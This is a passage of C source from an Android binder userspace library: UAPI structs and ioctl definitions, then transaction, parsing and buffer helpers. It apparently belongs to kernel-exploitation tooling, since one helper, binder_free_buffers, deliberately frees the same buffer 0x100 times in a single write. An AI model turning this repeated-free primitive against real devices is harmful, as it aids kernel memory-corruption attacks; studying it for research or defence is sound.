 * @cookie:	opaque data, used by user-space
 */
struct binder_fd_object {
	struct binder_object_header	hdr;
	__u32				pad_flags;
	union {
		binder_uintptr_t	pad_binder;
		__u32			fd;
	};

	binder_uintptr_t		cookie;
};

/* struct binder_buffer_object - object describing a userspace buffer
 * @hdr:		common header structure
 * @flags:		one or more BINDER_BUFFER_* flags
 * @buffer:		address of the buffer
 * @length:		length of the buffer
 * @parent:		index in offset array pointing to parent buffer
 * @parent_offset:	offset in @parent pointing to this buffer
 *
 * A binder_buffer object represents an object that the
 * binder kernel driver can copy verbatim to the target
 * address space. A buffer itself may be pointed to from
 * within another buffer, meaning that the pointer inside
 * that other buffer needs to be fixed up as well. This
 * can be done by setting the BINDER_BUFFER_FLAG_HAS_PARENT
 * flag in @flags, by setting @parent buffer to the index
 * in the offset array pointing to the parent binder_buffer_object,
 * and by setting @parent_offset to the offset in the parent buffer
 * at which the pointer to this buffer is located.
 */
struct binder_buffer_object {
	struct binder_object_header	hdr;
	__u32				flags;
	binder_uintptr_t		buffer;
	binder_size_t			length;
	binder_size_t			parent;
	binder_size_t			parent_offset;
};

enum {
	BINDER_BUFFER_FLAG_HAS_PARENT = 0x01,
};

/* struct binder_fd_array_object - object describing an array of fds in a buffer
 * @hdr:		common header structure
 * @pad:		padding to ensure correct alignment
 * @num_fds:		number of file descriptors in the buffer
 * @parent:		index in offset array to buffer holding the fd array
 * @parent_offset:	start offset of fd array in the buffer
 *
 * A binder_fd_array object represents an array of file
 * descriptors embedded in a binder_buffer_object. It is
 * different from a regular binder_buffer_object because it
 * describes a list of file descriptors to fix up, not an opaque
 * blob of memory, and hence the kernel needs to treat it differently.
 *
 * An example of how this would be used is with Android's
 * native_handle_t object, which is a struct with a list of integers
 * and a list of file descriptors. The native_handle_t struct itself
 * will be represented by a struct binder_buffer_objct, whereas the
 * embedded list of file descriptors is represented by a
 * struct binder_fd_array_object with that binder_buffer_object as
 * a parent.
 */
struct binder_fd_array_object {
	struct binder_object_header	hdr;
	__u32				pad;
	binder_size_t			num_fds;
	binder_size_t			parent;
	binder_size_t			parent_offset;
};

/*
 * On 64-bit platforms where user code may run in 32-bits the driver must
 * translate the buffer (and local binder) addresses appropriately.
 */

struct binder_write_read {
	binder_size_t		write_size;	/* bytes to write */
	binder_size_t		write_consumed;	/* bytes consumed by driver */
	binder_uintptr_t	write_buffer;
	binder_size_t		read_size;	/* bytes to read */
	binder_size_t		read_consumed;	/* bytes consumed by driver */
	binder_uintptr_t	read_buffer;
};

/* Use with BINDER_VERSION, driver fills in fields. */
struct binder_version {
	/* driver protocol version -- increment with incompatible change */
	__s32       protocol_version;
};

/* This is the current protocol version. */
#ifdef BINDER_IPC_32BIT
#define BINDER_CURRENT_PROTOCOL_VERSION 7
#else
#define BINDER_CURRENT_PROTOCOL_VERSION 8
#endif

/*
 * Use with BINDER_GET_NODE_DEBUG_INFO, driver reads ptr, writes to all fields.
 * Set ptr to NULL for the first call to get the info for the first node, and
 * then repeat the call passing the previously returned value to get the next
 * nodes.  ptr will be 0 when there are no more nodes.
 */
struct binder_node_debug_info {
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	__u32            has_strong_ref;
	__u32            has_weak_ref;
};

#define BINDER_WRITE_READ		_IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_IDLE_TIMEOUT		_IOW('b', 3, __s64)
#define BINDER_SET_MAX_THREADS		_IOW('b', 5, __u32)
#define BINDER_SET_IDLE_PRIORITY	_IOW('b', 6, __s32)
#define BINDER_SET_CONTEXT_MGR		_IOW('b', 7, __s32)
#define BINDER_THREAD_EXIT		_IOW('b', 8, __s32)
#define BINDER_VERSION			_IOWR('b', 9, struct binder_version)
#define BINDER_GET_NODE_DEBUG_INFO	_IOWR('b', 11, struct binder_node_debug_info)

/*
 * NOTE: Two special error codes you should check for when calling
 * in to the driver are:
 *
 * EINTR -- The operation has been interupted.  This should be
 * handled by retrying the ioctl() until a different error code
 * is returned.
 *
 * ECONNREFUSED -- The driver is no longer accepting operations
 * from your process.  That is, the process is being destroyed.
 * You should handle this by exiting from your process.  Note
 * that once this error code is returned, all further calls to
 * the driver from any thread will return this same code.
 */

enum transaction_flags {
	TF_ONE_WAY	= 0x01,	/* this is a one-way call: async, no return */
	TF_ROOT_OBJECT	= 0x04,	/* contents are the component's root object */
	TF_STATUS_CODE	= 0x08,	/* contents are a 32-bit status code */
	TF_ACCEPT_FDS	= 0x10,	/* allow replies with file descriptors */
};

struct binder_transaction_data {
	/* The first two are only used for bcTRANSACTION and brTRANSACTION,
	 * identifying the target and contents of the transaction.
	 */
	union {
		/* target descriptor of command transaction */
		__u32	handle;
		/* target descriptor of return transaction */
		binder_uintptr_t ptr;
	} target;
	binder_uintptr_t	cookie;	/* target object cookie */
	__u32		code;		/* transaction command */

	/* General information about the transaction. */
	__u32	        flags;
	pid_t		sender_pid;
	uid_t		sender_euid;
	binder_size_t	data_size;	/* number of bytes of data */
	binder_size_t	offsets_size;	/* number of bytes of offsets */

	/* If this transaction is inline, the data immediately
	 * follows here; otherwise, it ends with a pointer to
	 * the data buffer.
	 */
	union {
		struct {
			/* transaction data */
			binder_uintptr_t	buffer;
			/* offsets from buffer to flat_binder_object structs */
			binder_uintptr_t	offsets;
		} ptr;
		__u8	buf[8];
	} data;
};

struct binder_transaction_data_sg {
	struct binder_transaction_data transaction_data;
	binder_size_t buffers_size;
};

struct binder_ptr_cookie {
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
};

struct binder_handle_cookie {
	__u32 handle;
	binder_uintptr_t cookie;
} __packed;

struct binder_pri_desc {
	__s32 priority;
	__u32 desc;
};

struct binder_pri_ptr_cookie {
	__s32 priority;
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
};

enum binder_driver_return_protocol {
	BR_ERROR = _IOR('r', 0, __s32),
	/*
	 * int: error code
	 */

	BR_OK = _IO('r', 1),
	/* No parameters! */

	BR_TRANSACTION = _IOR('r', 2, struct binder_transaction_data),
	BR_REPLY = _IOR('r', 3, struct binder_transaction_data),
	/*
	 * binder_transaction_data: the received command.
	 */

	BR_ACQUIRE_RESULT = _IOR('r', 4, __s32),
	/*
	 * not currently supported
	 * int: 0 if the last bcATTEMPT_ACQUIRE was not successful.
	 * Else the remote object has acquired a primary reference.
	 */

	BR_DEAD_REPLY = _IO('r', 5),
	/*
	 * The target of the last transaction (either a bcTRANSACTION or
	 * a bcATTEMPT_ACQUIRE) is no longer with us.  No parameters.
	 */

	BR_TRANSACTION_COMPLETE = _IO('r', 6),
	/*
	 * No parameters... always refers to the last transaction requested
	 * (including replies).  Note that this will be sent even for
	 * asynchronous transactions.
	 */

	BR_INCREFS = _IOR('r', 7, struct binder_ptr_cookie),
	BR_ACQUIRE = _IOR('r', 8, struct binder_ptr_cookie),
	BR_RELEASE = _IOR('r', 9, struct binder_ptr_cookie),
	BR_DECREFS = _IOR('r', 10, struct binder_ptr_cookie),
	/*
	 * void *:	ptr to binder
	 * void *: cookie for binder
	 */

	BR_ATTEMPT_ACQUIRE = _IOR('r', 11, struct binder_pri_ptr_cookie),
	/*
	 * not currently supported
	 * int:	priority
	 * void *: ptr to binder
	 * void *: cookie for binder
	 */

	BR_NOOP = _IO('r', 12),
	/*
	 * No parameters.  Do nothing and examine the next command.  It exists
	 * primarily so that we can replace it with a BR_SPAWN_LOOPER command.
	 */

	BR_SPAWN_LOOPER = _IO('r', 13),
	/*
	 * No parameters.  The driver has determined that a process has no
	 * threads waiting to service incoming transactions.  When a process
	 * receives this command, it must spawn a new service thread and
	 * register it via bcENTER_LOOPER.
	 */

	BR_FINISHED = _IO('r', 14),
	/*
	 * not currently supported
	 * stop threadpool thread
	 */

	BR_DEAD_BINDER = _IOR('r', 15, binder_uintptr_t),
	/*
	 * void *: cookie
	 */
	BR_CLEAR_DEATH_NOTIFICATION_DONE = _IOR('r', 16, binder_uintptr_t),
	/*
	 * void *: cookie
	 */

	BR_FAILED_REPLY = _IO('r', 17),
	/*
	 * The the last transaction (either a bcTRANSACTION or
	 * a bcATTEMPT_ACQUIRE) failed (e.g. out of memory).  No parameters.
	 */
};

enum binder_driver_command_protocol {
	BC_TRANSACTION = _IOW('c', 0, struct binder_transaction_data),
	BC_REPLY = _IOW('c', 1, struct binder_transaction_data),
	/*
	 * binder_transaction_data: the sent command.
	 */

	BC_ACQUIRE_RESULT = _IOW('c', 2, __s32),
	/*
	 * not currently supported
	 * int:  0 if the last BR_ATTEMPT_ACQUIRE was not successful.
	 * Else you have acquired a primary reference on the object.
	 */

	BC_FREE_BUFFER = _IOW('c', 3, binder_uintptr_t),
	/*
	 * void *: ptr to transaction data received on a read
	 */

	BC_INCREFS = _IOW('c', 4, __u32),
	BC_ACQUIRE = _IOW('c', 5, __u32),
	BC_RELEASE = _IOW('c', 6, __u32),
	BC_DECREFS = _IOW('c', 7, __u32),
	/*
	 * int:	descriptor
	 */

	BC_INCREFS_DONE = _IOW('c', 8, struct binder_ptr_cookie),
	BC_ACQUIRE_DONE = _IOW('c', 9, struct binder_ptr_cookie),
	/*
	 * void *: ptr to binder
	 * void *: cookie for binder
	 */

	BC_ATTEMPT_ACQUIRE = _IOW('c', 10, struct binder_pri_desc),
	/*
	 * not currently supported
	 * int: priority
	 * int: descriptor
	 */

	BC_REGISTER_LOOPER = _IO('c', 11),
	/*
	 * No parameters.
	 * Register a spawned looper thread with the device.
	 */

	BC_ENTER_LOOPER = _IO('c', 12),
	BC_EXIT_LOOPER = _IO('c', 13),
	/*
	 * No parameters.
	 * These two commands are sent as an application-level thread
	 * enters and exits the binder loop, respectively.  They are
	 * used so the binder can have an accurate count of the number
	 * of looping threads it has available.
	 */

	BC_REQUEST_DEATH_NOTIFICATION = _IOW('c', 14,
						struct binder_handle_cookie),
	/*
	 * int: handle
	 * void *: cookie
	 */

	BC_CLEAR_DEATH_NOTIFICATION = _IOW('c', 15,
						struct binder_handle_cookie),
	/*
	 * int: handle
	 * void *: cookie
	 */

	BC_DEAD_BINDER_DONE = _IOW('c', 16, binder_uintptr_t),
	/*
	 * void *: cookie
	 */

	BC_TRANSACTION_SG = _IOW('c', 17, struct binder_transaction_data_sg),
	BC_REPLY_SG = _IOW('c', 18, struct binder_transaction_data_sg),
	/*
	 * binder_transaction_data_sg: the sent command.
	 */
};

#endif /* _UAPI_LINUX_BINDER_H */


```

`src/binder.c`:

```c
/* Copyright 2008 The Android Open Source Project
 */

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "log.h"
#include "binder.h"
#include "uapi_binder.h"

#define MAX_BIO_SIZE (1 << 30)

#define TRACE 0

void bio_init_from_txn(struct binder_io *io, struct binder_transaction_data *txn);

#if TRACE
void hexdump(void *_data, size_t len)
{
    unsigned char *data = _data;
    size_t count;

    for (count = 0; count < len; count++) {
        if ((count & 15) == 0)
            flog_info(stderr,"%04zu:", count);
        flog_info(stderr,"\\x%02x", *data);
        // flog_info(stderr," %02x %c", *data,
                // (*data < 32) || (*data > 126) ? '.' : *data);
        data++;
        if ((count & 15) == 15)
            flog_info(stderr,"\n");
    }
    if ((count & 15) != 0)
        flog_info(stderr,"\n");
}

void binder_dump_txn(struct binder_transaction_data *txn)
{
    struct flat_binder_object *obj;
    binder_size_t *offs = (binder_size_t *)(uintptr_t)txn->data.ptr.offsets;
    size_t count = txn->offsets_size / sizeof(binder_size_t);

    flog_info(stderr,"  target %016"PRIx64"  cookie %016"PRIx64"  code %08x  flags %08x\n",
            (uint64_t)txn->target.ptr, (uint64_t)txn->cookie, txn->code, txn->flags);
    flog_info(stderr,"  pid %8d  uid %8d  data %"PRIu64"  offs %"PRIu64"\n",
            txn->sender_pid, txn->sender_euid, (uint64_t)txn->data_size, (uint64_t)txn->offsets_size);
    hexdump((void *)(uintptr_t)txn->data.ptr.buffer, txn->data_size);
    while (count--) {
        obj = (struct flat_binder_object *) (((char*)(uintptr_t)txn->data.ptr.buffer) + *offs++);
        flog_info(stderr,"  - type %08x  flags %08x  ptr %016"PRIx64"  cookie %016"PRIx64"\n",
                obj->hdr.type, obj->flags, (uint64_t)obj->binder, (uint64_t)obj->cookie);
    }
}

#define NAME(n) case n: return #n
const char *cmd_name(uint32_t cmd)
{
    switch(cmd) {
        NAME(BR_NOOP);
        NAME(BR_TRANSACTION_COMPLETE);
        NAME(BR_INCREFS);
        NAME(BR_ACQUIRE);
        NAME(BR_RELEASE);
        NAME(BR_DECREFS);
        NAME(BR_TRANSACTION);
        NAME(BR_REPLY);
        NAME(BR_FAILED_REPLY);
        NAME(BR_DEAD_REPLY);
        NAME(BR_DEAD_BINDER);
    default: return "???";
    }
}
#else
#define hexdump(a,b) do{} while (0)
#define binder_dump_txn(txn)  do{} while (0)
#endif

#define NAME(n) case n: return #n
const char *cmd_name(uint32_t cmd)
{
    switch(cmd) {
        NAME(BR_NOOP);
        NAME(BR_TRANSACTION_COMPLETE);
        NAME(BR_INCREFS);
        NAME(BR_ACQUIRE);
        NAME(BR_RELEASE);
        NAME(BR_DECREFS);
        NAME(BR_TRANSACTION);
        NAME(BR_REPLY);
        NAME(BR_FAILED_REPLY);
        NAME(BR_DEAD_REPLY);
        NAME(BR_DEAD_BINDER);
    default: return "???";
    }
}


#define BIO_F_SHARED    0x01  /* needs to be buffer freed */
#define BIO_F_OVERFLOW  0x02  /* ran out of space */
#define BIO_F_IOERROR   0x04
#define BIO_F_MALLOCED  0x08  /* needs to be free()'d */

struct binder_state *binder_open(const char* driver, size_t mapsize)
{
    struct binder_state *bs;
    struct binder_version vers;

    bs = malloc(sizeof(*bs));
    if (!bs) {
        errno = ENOMEM;
        return NULL;
    }

    bs->fd = open(driver, O_RDWR | O_CLOEXEC);
    if (bs->fd < 0) {
        log_info("binder: cannot open %s (%s)\n",
                driver, strerror(errno));
        goto fail_open;
    }

    if ((ioctl(bs->fd, BINDER_VERSION, &vers) == -1) ||
        (vers.protocol_version != BINDER_CURRENT_PROTOCOL_VERSION)) {
        log_info(
                "binder: kernel driver version (%d) differs from user space version (%d)\n",
                vers.protocol_version, BINDER_CURRENT_PROTOCOL_VERSION);
        goto fail_open;
    }

    bs->mapsize = mapsize;
    bs->mapped = mmap(NULL, mapsize, PROT_READ, MAP_PRIVATE, bs->fd, 0);
    if (bs->mapped == MAP_FAILED) {
        log_info("binder: cannot map device (%s)\n",
                strerror(errno));
        goto fail_map;
    }

    return bs;

fail_map:
    close(bs->fd);
fail_open:
    free(bs);
    return NULL;
}

void binder_close(struct binder_state *bs)
{
    munmap(bs->mapped, bs->mapsize);
    close(bs->fd);
    free(bs);
}

int binder_become_context_manager(struct binder_state *bs)
{
    return ioctl(bs->fd, BINDER_SET_CONTEXT_MGR, 0);
}

int binder_write(struct binder_state *bs, void *data, size_t len)
{
    struct binder_write_read bwr;
    int res;

    bwr.write_size = len;
    bwr.write_consumed = 0;
    bwr.write_buffer = (uintptr_t) data;
    bwr.read_size = 0;
    bwr.read_consumed = 0;
    bwr.read_buffer = 0;
    res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
    if (res < 0) {
        log_info("binder_write: ioctl failed (%s)\n",
                strerror(errno));
    }
    return res;
}

/*
 * This is just sending 0x100 commands to free the buffer in a row,
 * saving us a few syscalls.
 */
void binder_free_buffers(struct binder_state *bs, binder_uintptr_t buffer_to_free)
{
    struct free_buf_data {
        uint32_t cmd_free;
        binder_uintptr_t buffer;
    } __attribute__((packed)) ;

    struct free_buf_data data[0x100];
    int i;

    for(i=0; i < 0x100; i++){
        data[i].cmd_free = BC_FREE_BUFFER;
        data[i].buffer = buffer_to_free;
    }

    binder_write(bs, &data[0], sizeof(data));
//    binder_write(bs, &data[0], sizeof(struct free_buf_data) * 0x10);

}


void binder_free_buffer(struct binder_state *bs,
                        binder_uintptr_t buffer_to_free)
{
    struct {
        uint32_t cmd_free;
        binder_uintptr_t buffer;
    } __attribute__((packed)) data;
    data.cmd_free = BC_FREE_BUFFER;
    data.buffer = buffer_to_free;
    binder_write(bs, &data, sizeof(data));
}

void binder_send_reply(struct binder_state *bs,
                       struct binder_io *reply,
                       binder_uintptr_t buffer_to_free,
                       int status)
{
    struct {
        uint32_t cmd_free;
        binder_uintptr_t buffer;
        uint32_t cmd_reply;
        struct binder_transaction_data txn;
    } __attribute__((packed)) data;

    data.cmd_free = BC_FREE_BUFFER;
    data.buffer = buffer_to_free;
    data.cmd_reply = BC_REPLY;
    data.txn.target.ptr = 0;
    data.txn.cookie = 0;
    data.txn.code = 0;
    if (status) {
        data.txn.flags = TF_STATUS_CODE;
        data.txn.data_size = sizeof(int);
        data.txn.offsets_size = 0;
        data.txn.data.ptr.buffer = (uintptr_t)&status;
        data.txn.data.ptr.offsets = 0;
    } else {
        data.txn.flags = 0;
        data.txn.data_size = reply->data - reply->data0;
        data.txn.offsets_size = ((char*) reply->offs) - ((char*) reply->offs0);
        data.txn.data.ptr.buffer = (uintptr_t)reply->data0;
        data.txn.data.ptr.offsets = (uintptr_t)reply->offs0;
    }
    binder_write(bs, &data, sizeof(data));
}

int binder_parse(struct binder_state *bs, struct binder_io *bio,
                 uintptr_t ptr, size_t size, binder_handler func)
{
    int r = 1;
    uintptr_t end = ptr + (uintptr_t) size;

    while (ptr < end) {
        uint32_t cmd = *(uint32_t *) ptr;
        ptr += sizeof(uint32_t);
#if TRACE
        log_info("%s:\n", cmd_name(cmd));
#endif
        switch(cmd) {
        case BR_NOOP:
            break;
        case BR_TRANSACTION_COMPLETE:
            break;
        case BR_INCREFS:
        case BR_ACQUIRE:
        case BR_RELEASE:
        case BR_DECREFS:
#if TRACE
            log_info("  %p, %p\n", (void *)ptr, (void *)(ptr + sizeof(void *)));
#endif
            ptr += sizeof(struct binder_ptr_cookie);
            break;
        case BR_TRANSACTION: {
            struct binder_transaction_data *txn = (struct binder_transaction_data *) ptr;
            if ((end - ptr) < sizeof(*txn)) {
                ALOGE("parse: txn too small!\n");
                return -1;
            }
            binder_dump_txn(txn);
            if (func) {
                unsigned rdata[256/4];
                struct binder_io msg;
                struct binder_io reply;
                int res;

                bio_init(&reply, rdata, sizeof(rdata), 4);
                bio_init_from_txn(&msg, txn);
                res = func(bs, txn, &msg, &reply);
                if (txn->flags & TF_ONE_WAY) {
                    binder_free_buffer(bs, txn->data.ptr.buffer);
                } else {
                    binder_send_reply(bs, &reply, txn->data.ptr.buffer, res);
                }
            }
            ptr += sizeof(*txn);
            break;
        }
        case BR_REPLY: {
            struct binder_transaction_data *txn = (struct binder_transaction_data *) ptr;
            if ((end - ptr) < sizeof(*txn)) {
                ALOGE("parse: reply too small!\n");
                return -1;
            }
            binder_dump_txn(txn);
            if (bio) {
                bio_init_from_txn(bio, txn);
                bio = 0;
            } else {
                /* todo FREE BUFFER */
            }
            ptr += sizeof(*txn);
            r = 0;
            break;
        }
        case BR_DEAD_BINDER: {
            struct binder_death *death = (struct binder_death *)(uintptr_t) *(binder_uintptr_t *)ptr;
            ptr += sizeof(binder_uintptr_t);
            death->func(bs, death->ptr);
            break;
        }
        case BR_FAILED_REPLY:
            r = -1;
            break;
        case BR_DEAD_REPLY:
            r = -1;
            break;
        default:
            ALOGE("parse: OOPS %d\n", cmd);
            return -1;
        }
    }

    return r;
}

void binder_acquire(struct binder_state *bs, uint32_t target)
{
    uint32_t cmd[2];
    cmd[0] = BC_ACQUIRE;
    cmd[1] = target;
    binder_write(bs, cmd, sizeof(cmd));
}

void binder_release(struct binder_state *bs, uint32_t target)
{
    uint32_t cmd[2];
    cmd[0] = BC_RELEASE;
    cmd[1] = target;
    binder_write(bs, cmd, sizeof(cmd));
}

void binder_link_to_death(struct binder_state *bs, uint32_t target, struct binder_death *death)
{
    struct {
        uint32_t cmd;
        struct binder_handle_cookie payload;
    } __attribute__((packed)) data;

    data.cmd = BC_REQUEST_DEATH_NOTIFICATION;
    data.payload.handle = target;
    data.payload.cookie = (uintptr_t) death;
    binder_write(bs, &data, sizeof(data));
}

int binder_call(struct binder_state *bs,
                struct binder_io *msg, struct binder_io *reply,
                uint32_t target, uint32_t code) {

    return binder_call2(bs, msg, reply, target, code, NULL);

}

int binder_call2(struct binder_state *bs,
                struct binder_io *msg, struct binder_io *reply,
                uint32_t target, uint32_t code, char *buffer)
{
    int res;
    struct binder_write_read bwr;
    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
    } __attribute__((packed)) writebuf;
    unsigned readbuf[32];

    if (msg->flags & BIO_F_OVERFLOW) {
        log_info("binder: txn buffer overflow\n");
        goto fail;
    }

    writebuf.cmd = BC_TRANSACTION;
    writebuf.txn.target.handle = target;
    writebuf.txn.code = code;
    writebuf.txn.flags = 0;
    writebuf.txn.data_size = msg->data - msg->data0;
    writebuf.txn.offsets_size = ((char*) msg->offs) - ((char*) msg->offs0);
    writebuf.txn.data.ptr.buffer = (uintptr_t)msg->data0;
    writebuf.txn.data.ptr.offsets = (uintptr_t)msg->offs0;

    bwr.write_size = sizeof(writebuf);
    bwr.write_consumed = 0;
    bwr.write_buffer = (uintptr_t) &writebuf;
    bwr.read_size = 0;
    bwr.read_consumed = 0;
    bwr.read_buffer = 0;

    // log_err("---------------- writebuf -------------\n");
    // hexdump(&writebuf, sizeof(writebuf));
    // log_err("----------------   Data   -------------\n");
    // hexdump(msg->data0, msg->data - msg->data0);
    // log_err("---------------- Offsets  -------------\n");
    // hexdump(msg->offs0, writebuf.txn.offsets_size);
    // log_err("IOCTL CODE: %x\n", BINDER_WRITE_READ);
    // log_err("DATA PTR: %p\n", msg->data0);
    // log_err("OFFS PTR: %p\n", msg->offs0);

    // log_err("---------------- bwr ------------------\n");
    // hexdump(&bwr, sizeof(bwr));

    for (;;) {
        uintptr_t thereadbuf = (buffer) ? (uintptr_t)buffer : (uintptr_t)readbuf;
        bwr.read_size = sizeof(readbuf);
        bwr.read_consumed = 0;
        bwr.read_buffer = thereadbuf;

        res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

        if (res < 0) {
            log_info("binder: ioctl failed (%s)\n", strerror(errno));
            goto fail;
        }

        res = binder_parse(bs, reply, (uintptr_t) thereadbuf, bwr.read_consumed, 0);
        if (res == 0) return 0;
        if (res < 0) goto fail;
    }

fail:
    memset(reply, 0, sizeof(*reply));
    reply->flags |= BIO_F_IOERROR;
    return -1;
}

int binder_call3(struct binder_state *bs,
                struct binder_io *msg, struct binder_io *reply,
                uint32_t target, uint32_t code, char *buffer)
{
    int res;
    struct binder_write_read bwr;
    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
    } __attribute__((packed)) writebuf;
    unsigned readbuf[32];

    if (msg->flags & BIO_F_OVERFLOW) {
        log_info("binder: txn buffer overflow\n");
        goto fail;
    }

    writebuf.cmd = BC_TRANSACTION;
    writebuf.txn.target.handle = target;
    writebuf.txn.code = code;
    writebuf.txn.flags = 0;
    writebuf.txn.data_size = msg->data - msg->data0;
    writebuf.txn.offsets_size = ((char*) msg->offs) - ((char*) msg->offs0);
    writebuf.txn.data.ptr.buffer = (uintptr_t)msg->data0;
    writebuf.txn.data.ptr.offsets = (uintptr_t)msg->offs0;

    bwr.write_size = sizeof(writebuf);
    bwr.write_consumed = 0;
    bwr.write_buffer = (uintptr_t) &writebuf;
    bwr.read_size = 0;
    bwr.read_consumed = 0;
    bwr.read_buffer = 0;

    // log_err("---------------- writebuf -------------\n");
    // hexdump(&writebuf, sizeof(writebuf));
    // log_err("----------------   Data   -------------\n");
    // hexdump(msg->data0, msg->data - msg->data0);
    // log_err("---------------- Offsets  -------------\n");
    // hexdump(msg->offs0, writebuf.txn.offsets_size);
    // log_err("IOCTL CODE: %x\n", BINDER_WRITE_READ);
    // log_err("DATA PTR: %p\n", msg->data0);
    // log_err("OFFS PTR: %p\n", msg->offs0);

    // log_err("---------------- bwr ------------------\n");
    // hexdump(&bwr, sizeof(bwr));

    for (;;) {
        uintptr_t thereadbuf = (buffer) ? (uintptr_t)buffer : (uintptr_t)readbuf;
        bwr.read_size = sizeof(readbuf);
        bwr.read_consumed = 0;
        bwr.read_buffer = thereadbuf;

        res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

        if (res < 0) {
            log_info("binder: ioctl failed (%s)\n", strerror(errno));
            goto fail;
        }

        res = binder_parse(bs, reply, (uintptr_t) thereadbuf, bwr.read_consumed, 0);
        if (res == 0) return 0;
        if (res < 0) goto fail;
    }

fail:
    memset(reply, 0, sizeof(*reply));
    reply->flags |= BIO_F_IOERROR;
    return -1;
}


void binder_loop(struct binder_state *bs, binder_handler func)
{
    int res;
    struct binder_write_read bwr;
    uint32_t readbuf[32];

    bwr.write_size = 0;
    bwr.write_consumed = 0;
    bwr.write_buffer = 0;

    readbuf[0] = BC_ENTER_LOOPER;
    binder_write(bs, readbuf, sizeof(uint32_t));

    for (;;) {
        bwr.read_size = sizeof(readbuf);
        bwr.read_consumed = 0;
        bwr.read_buffer = (uintptr_t) readbuf;

        res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

        if (res < 0) {
            ALOGE("binder_loop: ioctl failed (%s)\n", strerror(errno));
            break;
        }

        res = binder_parse(bs, 0, (uintptr_t) readbuf, bwr.read_consumed, func);
        if (res == 0) {
            ALOGE("binder_loop: unexpected reply?!\n");
            break;
        }
        if (res < 0) {
            ALOGE("binder_loop: io error %d %s\n", res, strerror(errno));
            break;
        }
    }
}

void binder_handle_transaction(struct binder_state *bs, binder_handler func)
{
    int res;
    struct binder_write_read bwr;
    uint32_t readbuf[32];

    bwr.write_size = 0;
    bwr.write_consumed = 0;
    bwr.write_buffer = 0;

    readbuf[0] = BC_ENTER_LOOPER;
    binder_write(bs, readbuf, sizeof(uint32_t));

	bwr.read_size = sizeof(readbuf);
	bwr.read_consumed = 0;
	bwr.read_buffer = (uintptr_t) readbuf;

	res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

	if (res < 0) {
	    ALOGE("binder_loop: ioctl failed (%s)\n", strerror(errno));
	    return;
	}

	res = binder_parse(bs, 0, (uintptr_t) readbuf, bwr.read_consumed, func);
	if (res == 0) {
	    ALOGE("binder_loop: unexpected reply?!\n");
	    return;
	}
	if (res < 0) {
	    ALOGE("binder_loop: io error %d %s\n", res, strerror(errno));
	    return;
	}
}


void bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)
{
    bio->data = bio->data0 = (char *)(intptr_t)txn->data.ptr.buffer;
    bio->offs = bio->offs0 = (binder_size_t *)(intptr_t)txn->data.ptr.offsets;
    bio->data_avail = txn->data_size;
    bio->offs_avail = txn->offsets_size / sizeof(size_t);
    bio->flags = BIO_F_SHARED;

}

void bio_init(struct binder_io *bio, void *data,
              size_t maxdata, size_t maxoffs)
{
    size_t n = maxoffs * sizeof(size_t);

    if (n > maxdata) {
        bio->flags = BIO_F_OVERFLOW;
        bio->data_avail = 0;
        bio->offs_avail = 0;
        return;
    }

    bio->data = bio->data0 = (char *) data + n;
    bio->offs = bio->offs0 = data;
    bio->data_avail = maxdata - n;
    bio->offs_avail = maxoffs;
    bio->flags = 0;
}

void *bio_alloc(struct binder_io *bio, size_t size)
{
    size = (size + 3) & (~3);
    if (size > bio->data_avail) {
        bio->flags |= BIO_F_OVERFLOW;
        return NULL;
    } else {
        void *ptr = bio->data;
        bio->data += size;
        bio->data_avail -= size;
        return ptr;
    }
}

void binder_done(struct binder_state *bs,
                 struct binder_io *msg,
                 struct binder_io *reply)
{
    struct {
        uint32_t cmd;
        uintptr_t buffer;
    } __attribute__((packed)) data;

    if (reply->flags & BIO_F_SHARED) {
        data.cmd = BC_FREE_BUFFER;
        data.buffer = (uintptr_t) reply->data0;
        binder_write(bs, &data, sizeof(data));
        reply->flags = 0;
    }
}

static struct flat_binder_object *bio_alloc_obj(struct binder_io *bio)
{
    struct flat_binder_object *obj;

    obj = bio_alloc(bio, sizeof(*obj));

    if (obj && bio->offs_avail) {
        bio->offs_avail--;
        *bio->offs++ = ((char*) obj) - ((char*) bio->data0);
        return obj;
    }

    bio->flags |= BIO_F_OVERFLOW;
    return NULL;
}

void bio_put_uint32(struct binder_io *bio, uint32_t n)
{
    uint32_t *ptr = bio_alloc(bio, sizeof(n));
    if (ptr)
        *ptr = n;
}

void bio_put_obj(struct binder_io *bio, void *ptr)
{
    struct flat_binder_object *obj;

    obj = bio_alloc_obj(bio);
    if (!obj)
        return;

    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
    obj->hdr.type = BINDER_TYPE_BINDER;
    obj->binder = (uintptr_t)ptr;
    obj->cookie = 0;
}

void bio_put_weak_obj(struct binder_io *bio, void *ptr)
{
    struct flat_binder_object *obj;

    obj = bio_alloc_obj(bio);
    if (!obj)
        return;

    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
    obj->hdr.type = BINDER_TYPE_WEAK_BINDER;
    obj->binder = (uintptr_t)ptr;
    obj->cookie = 0;


}


/* Add an offset to the list. */
void bio_add_offset(struct binder_io *bio, uint64_t offset)
{
	if (!bio->offs_avail)
		return;
	bio->offs_avail--;
	*bio->offs++ = offset;
}

/* Create a BINDER_TYPE_PTR object, which will contain arbitrary data. This can for example
 * be used to contains an array of file descriptors as used by the BINDER_TYPE_FDA, which
 * references the array within the BINDER_TYPE_PTR object.
 * The function returns a pointer to the allocated data, so that it can be set. If the "off"
 * pointer is submitted to the function, it will set it as well.
 */
void *bio_put_ptr(struct binder_io *bio, void *buffer, uint32_t size, uint32_t *off)
{
	struct binder_buffer_object *obj;
//	uint32_t _off = (bio->data - bio->data0);


	/* Allocate the object size + the size of the data we want it to contain. */
	obj = bio_alloc(bio, sizeof(*obj) + size);
	if (!obj)
		return NULL;

